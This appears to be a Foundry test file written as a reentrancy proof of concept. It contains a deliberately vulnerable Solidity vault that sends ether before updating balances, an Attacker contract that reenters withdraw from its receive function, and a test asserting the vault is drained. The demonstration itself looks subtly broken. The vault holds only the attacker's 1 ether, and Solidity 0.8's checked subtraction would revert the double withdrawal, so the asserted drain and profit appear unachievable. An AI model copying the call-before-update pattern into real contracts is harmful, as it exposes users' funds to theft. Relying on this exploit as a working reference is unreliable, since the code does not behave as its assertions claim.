// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerability: External call before state update (Reentrancy)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract ExploitTest is Test {
    VulnerableVault vault;
    address attacker;

    function setUp() public {
        // Deploy the vulnerable contract
        vault = new VulnerableVault();

        // Set up the attacker address
        attacker = address(new Attacker(vault));

        // Fund the attacker with some initial ETH
        vm.deal(attacker, 1 ether);

        // Attacker deposits 1 ether into the vault
        vm.prank(attacker);
        vault.deposit{value: 1 ether}();
    }

    function test_exploit() public {
        // Initial balance of the vault
        uint initialVaultBalance = address(vault).balance;

        // Attacker executes the exploit
        vm.prank(attacker);
        Attacker(attacker).exploit();

        // Assert that the vault's balance is drained
        assertEq(address(vault).balance, 0);

        // Assert that the attacker has more than their initial deposit
        assertGt(attacker.balance, 1 ether);
    }
}

contract Attacker {
    VulnerableVault public vault;
    bool internal reentered;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function exploit() external {
        reentered = false;
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            vault.withdraw(1 ether);
        }
    }
}